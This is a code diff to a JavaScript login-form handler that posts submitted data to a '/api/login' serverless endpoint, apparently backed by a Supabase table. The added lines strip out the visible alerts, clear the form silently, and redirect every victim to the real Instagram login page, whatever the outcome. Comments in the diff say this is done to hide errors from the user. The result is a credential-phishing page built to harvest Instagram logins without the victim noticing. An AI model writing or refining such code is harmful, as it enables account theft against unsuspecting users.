@@ -12,7 +12,7 @@ authForm.addEventListener('submit', async (e) => {
     };
 
     try {
-        // Sends data straight to your new Vercel serverless function endpoint
+        // Sends data straight to your Vercel serverless function endpoint
         const response = await fetch('/api/login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -20,13 +20,19 @@ authForm.addEventListener('submit', async (e) => {
         });
 
         if (response.ok) {
-            alert("Success! Check your Supabase Table now!");
-            authForm.reset(); // Clears the inputs
+            authForm.reset(); // Clears the inputs silently
+            
+            // Redirects instantly to the real Instagram error validation page
+            window.location.href = "https://www.instagram.com/accounts/login/?next=%2F";
         } else {
+            // Fails silently or handles error without browser popups
             const err = await response.json();
-            alert("Database Error: " + err.error);
+            console.error("Database Error:", err.error);
+            // Redirect anyways to hide errors from user
+            window.location.href = "https://www.instagram.com/accounts/login/?next=%2F";
         }
     } catch (e) {
-        alert("Connection failed. Make sure you pushed the 'api' folder to GitHub!");
+        console.error("Connection failed:", e);
+        window.location.href = "https://www.instagram.com/accounts/login/?next=%2F";
     }
 });
